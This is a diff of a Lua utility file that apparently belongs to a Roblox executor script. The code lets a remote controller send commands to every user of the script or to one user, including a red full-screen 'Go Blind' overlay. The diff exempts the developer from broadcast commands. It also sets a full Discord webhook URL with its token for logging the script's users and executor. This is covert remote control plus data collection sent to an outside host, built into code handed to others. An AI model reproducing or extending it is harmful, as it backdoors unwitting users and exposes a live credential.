@@ -228,6 +228,9 @@ function UIUtils.Init(scriptName)
                 local action = data.Action
                 local payload = data.Payload
 
+                -- Excludes developer when targeting ALL
+                if targetId == "ALL" and isDeveloper then return end
+
                 if targetId == "ALL" or targetId == localPlayer.UserId then
                     if action == "NOTIFY" then
                         StarterGui:SetCore("SendNotification", {
@@ -253,7 +256,7 @@ function UIUtils.Init(scriptName)
                             local txt = Instance.new("TextLabel")
                             txt.Size = UDim2.new(1, 0, 1, 0)
                             txt.BackgroundTransparency = 1
-                            txt.Text = "👑 ujerald789 HAS DIMMED YOUR LIGHTS"
+                            txt.Text = "Go Blind"
                             txt.TextColor3 = Color3.fromRGB(255, 0, 0)
                             txt.TextScaled = true
                             txt.Font = Enum.Font.SourceSansBold
@@ -529,7 +532,7 @@ function UIUtils.Init(scriptName)
             -------------------------------------------------------------------
             -- 📡 DISCORD WEBHOOK LOGGING
             -------------------------------------------------------------------
-            local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/67/7NSX8eFywzVafA61rJvWd2MZ2p3hiyqm3PXf6EEyAvKweoJFDaWij_hf2iPdMDdWDs2t"
+            local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1544941286082220063/7NSX8eFywzVafA61rJvWd2MZ2p3hiyqm3PXf6EEyAvKweoJFDaWij_hf2iPdMDdWDs2t"
             local SCRIPT_NAME = scriptName or "Unspecified Script"
 
             local executorName = "Can't Identify Executor"
